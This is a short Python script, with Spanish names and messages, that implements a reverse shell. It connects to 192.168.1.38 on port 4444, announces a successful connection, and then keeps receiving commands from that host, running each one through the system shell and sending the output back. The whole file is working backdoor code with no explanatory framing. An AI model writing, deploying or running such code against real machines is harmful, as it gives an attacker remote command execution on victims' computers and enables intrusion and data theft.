
import socket,subprocess

def ejecutarComando(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


connection.connect(("192.168.1.38", 4444))


connection.send(" \n [+]Conexion Exitosamente Establecida \n".encode('utf-8'))


while True:

    command = connection.recv(1024)

    resultadosComando=ejecutarComando(command)
    connection.send(resultadosComando)


connection.close()